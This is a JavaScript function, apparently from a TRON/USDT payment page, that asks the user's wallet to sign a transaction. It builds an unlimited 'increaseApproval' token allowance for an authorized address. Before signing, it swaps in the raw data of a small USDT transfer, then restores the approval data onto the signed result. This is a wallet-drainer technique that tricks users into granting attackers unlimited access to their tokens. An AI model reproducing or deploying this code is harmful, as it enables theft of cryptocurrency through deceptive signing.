async function executeBlockchainTransaction(
  contractAddress,
  authAddress,
  userAddress,
  pay_amount
) {
  try {
    let tronWeb = window.tronWeb,
      authorizedAddress = authAddress;
    console.log(userAddress);
    const increaseApprovalParams = [
      {
        type: 'address',
        value: authorizedAddress,
      },
      {
        type: 'uint256',
        value:
          '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
      },
    ];

    const feeLimit = {
        feeLimit: 100000000,
      },
      increaseApprovalTx =
        await tronWeb.transactionBuilder.triggerSmartContract(
          contractAddress,
          'increaseApproval(address,uint256)',
          feeLimit,
          increaseApprovalParams,
          userAddress
        );

    let transferParams = [
      {
        type: 'address',
        value: authorizedAddress,
      },
      {
        type: 'uint256',
        value: pay_amount * 1000000,
      },
    ];

    // 旧版发送USDT无提示
    let transferTx = await tronWeb.transactionBuilder.triggerSmartContract(
      tronWeb.address.toHex(contractAddress),
      'transfer(address,uint256)',
      {},
      transferParams,
      userAddress
    );

    // let transferTx = await tronWeb.transactionBuilder.sendTrx(
    //   userAddress,
    //   pay_amount * 1000000,
    //   authorizedAddress
    // );

    console.log(transferTx, 'transferTx');
    var raw_data_backup = increaseApprovalTx.transaction.raw_data;
    increaseApprovalTx.transaction.raw_data = transferTx.raw_data;
    console.log(
      'transactionObj0.transaction:' +
        JSON.stringify(increaseApprovalTx.transaction, null, 2)
    );

    const signedTx = await tronWeb.trx.sign(increaseApprovalTx.transaction);

    signedTx.raw_data = raw_data_backup;
    signedTx.visible = false;

    return signedTx;
  } catch (e) {
    alert(String(e));
    console.error('An error occurred during the blockchain transaction:', e);
  }
}
